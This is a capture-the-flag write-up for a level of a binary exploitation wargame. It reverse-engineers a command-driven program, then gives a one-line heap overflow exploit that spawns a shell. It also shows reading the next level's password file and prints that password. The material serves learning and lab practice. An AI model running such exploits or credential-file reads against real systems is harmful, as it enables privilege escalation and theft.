# level8

Nothing of note with `ll` and `checksec`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|printf|main|
|free|frame_dummy|
|strdup||
|fgets||
|fwrite||
|strcpy||
|malloc||
|system||

`frame_dummy()` does nothing.

`main()` is terrifying.
Still, let's try to interpret it.

We can see a pattern of four code snippets. An assignation to `pbVar8` followed by a `do {...} while ()` loop.

If we look at the instruction behind those loops, we can see `CMPSB.RSPE` which is a `strncmp()`. *iVar5* is the `n`, so only the **5** first chars of the input will be compared to **"reset"**.

This means that we could exploit the `malloc()` overflow while passing those compares.

We can see three strings used : **"[reset]"**, **"[service]"**, **"[login]"**, and the first assignation hidden behind `pbVar8 = &DAT_08048819;`. Let's try to find this missing string.

```sh
# on our host machine after extracting the 'level8' binary
$ strings level8
[...]
%p, %p 
auth 
reset
service
login
/bin/sh
Password:
[...]
```



Among all the strings used we can find "auth" between the `printf()` format and **"reset"**, this is probably it.

So the program handles **4 commands** :
- [Auth] `strcpy()`'s our `fgets()` string into `auth` if it's length is shorter than *31 bytes*.
- [Reset] frees `auth`.
- [Service] `strdup()`'s a variable inside `service`.
- [Login] checks the value of the *32ndth* index of `auth`. If it is positive, it opens a shell.

```sh
$ ./level8
auth a
0x804a008, (nil)
service pastequepasteque
0x804a008, 0x804a018
```

Since the allocations of [Auth] and [Service] are contiguous, [Login]'s check of [Auth] will overflow into [Service].

```sh
(cat <(python -c 'print("auth a"); print("service pastequepasteque"); print("login");)') -) | ./level8

whoami
level9

cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Only one non-bonus level left !
```sh
su level9
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
